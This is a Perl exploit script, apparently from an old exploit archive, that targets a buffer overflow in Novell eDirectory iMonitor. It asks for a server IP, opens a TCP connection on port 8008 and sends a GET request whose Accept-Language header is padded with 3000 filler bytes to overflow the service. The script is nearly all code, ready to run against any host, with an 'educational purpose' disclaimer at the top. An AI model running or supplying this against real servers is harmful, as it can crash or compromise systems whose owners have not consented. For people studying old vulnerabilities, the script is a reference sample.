#!usr/bin/perl -w

#######################################################################################
#   Novell eDirectory iMonitor 'Accept-Language' Request Buffer Overflow Vulnerability
#   Refer:
#        http://www.securityfocus.com/bid/33928/discuss
#
#    To run this exploit on MS Windows replace "#!usr/bin/perl -w" with
#     "#!Installation_path_for_perl -w" (say #!C:/Program Files/Perl/bin/perl -w)
#
#$$$$$This was strictly written for educational purpose. Use it at your own risk.$$$$$
#$$$$$Author will not bare any responsibility for any damages watsoever.$$$$$$$$$$$$$$
#
#        Author:    Praveen Dar$hanam
#        Email:     praveen[underscore]recker[at]sify.com
#         Blog:        http://www.darshanams.blogspot.com/
#        Date:      02nd March, 2009
#         Visit:        http://www.evilfingers.com/
#
########Thanx to str0ke, milw0rm, @rP m@n, and all the Security Folks###################
########################################################################################

use IO::Socket;

print("\nEnter IP Address of Novell eDirectory iMonitor Server \n");
$vuln_host_ip = <STDIN>;
chomp($vuln_host_ip);
$port = 8008;
#Secure transfer uses TCP 8010 port

$sock_http = IO::Socket::INET->new(   PeerAddr => $vuln_host_ip,
                                     PeerPort => $port,
                                     Proto    => 'tcp') || "Unable to create HTTP Socket";

$buff1= "C" x 1000;
$buff2= "D" x 1000;
$buff3= "E" x 1000;
$mal_buff=$buff1.$buff2.$buff3;
# It is just a PoC

$http_attack = "GET /nds/ HTTP/1.1\r\n".
"Host: $vuln_host_ip:$port\r\n".
"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
"Accept-Language: en, $mal_buff;q=0.8\r\n".
"Keep-Alive: 300\r\n".
"Connection: keep-alive\r\n".
"\r\n";

print $sock_http $http_attack;
print "\nOverflow request sent....";
sleep(5);

close($sock_http);

